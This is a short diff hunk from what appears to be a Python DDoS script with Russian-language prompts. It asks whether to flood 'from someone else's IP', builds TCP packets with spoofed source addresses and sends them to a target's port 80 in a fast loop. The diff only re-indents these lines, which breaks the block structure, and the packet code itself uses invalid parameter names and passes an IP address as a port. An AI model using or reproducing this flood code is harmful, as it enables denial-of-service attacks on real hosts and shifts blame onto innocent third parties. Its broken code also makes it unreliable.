@@ -35,11 +35,11 @@ if input('Вы хотите ввести чужой IP для DDoS с него? 
     user_ip = input('Введите IP: => ')
     ips.append(user_ip)
     ip = choice(ips)
-                    port = int(choice(ports))
-                    IP1 = IP(source_IP=choice(ips), destination=target)
-                    TCP1 = TCP(srcport=choice(ips), dstport=80)
-                    pkt = IP1 / TCP1
-                    send(pkt, inter=.001)
+port = int(choice(ports))
+IP1 = IP(source_IP=choice(ips), destination=target)
+TCP1 = TCP(srcport=choice(ips), dstport=80)
+pkt = IP1 / TCP1
+send(pkt, inter=.001)
 
 ip = str(input(" HOST/IP:=> "))
 port = int(input(" PORT:=> "))
